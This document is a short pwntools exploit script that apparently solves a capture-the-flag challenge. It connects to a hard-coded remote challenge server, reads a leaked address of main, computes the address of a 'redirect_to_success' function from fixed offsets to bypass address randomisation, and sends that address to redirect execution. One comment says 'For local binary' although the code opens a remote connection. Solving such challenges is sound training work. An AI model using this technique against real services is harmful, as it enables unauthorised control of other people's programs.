from pwn import *

# The addresses of main and redirect_to_success (from disassembly)
main_offset =  0x11ad # Address of main function from GDB disassembly
redirect_to_success_offset = 0x1266 # Address of redirect_to_success function from GDB disassembly

# Start the process
# Replace with the actual binary name or use remote connection if necessary
# For local binary:
p = remote("34.131.133.224", 12346)

# Leak the address of main (from the `leak_address` function)
# The output should be printed by the program itself, so we capture it
output = p.recvline().decode()
print("Program output:", output)

# Extract the leaked address of main from the output
# We know it prints a hint, like: "Hint: The main function is located at 0x7ffff7a5c123"
leaked_address = int(output.split()[-1], 16)  # Convert the last word to an integer (hex)

print(f"Leaked main address: {hex(leaked_address)}")

# Calculate the address of the redirect_to_success function
target_address = leaked_address + (redirect_to_success_offset - main_offset)
print(f"Calculated address of redirect_to_success: {hex(target_address)}")

# Send the calculated address as input to the program
p.sendline(hex(target_address))

# Now, the program should redirect to the 'redirect_to_success' function
# And we can capture the output
final_output = p.recvall().decode()
print("Final program output:", final_output)

# Optionally, close the process after execution
p.close()
